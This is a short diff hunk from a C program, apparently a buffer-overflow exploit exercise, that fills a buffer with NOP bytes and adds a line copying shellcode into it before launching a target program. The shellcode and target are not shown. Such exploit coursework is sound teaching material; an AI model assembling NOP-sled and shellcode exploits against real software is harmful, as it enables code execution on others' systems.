@@ -19,7 +19,7 @@ int main(void)
 
   char bufferExploit[BUFFER_SIZE];
   memset(bufferExploit, NOP, BUFFER_SIZE);
-
+  memcpy(bufferExploit, shellcode, strlen(shellcode));
 
   args[0] = TARGET; 
   //args[1] = "hi there"; 
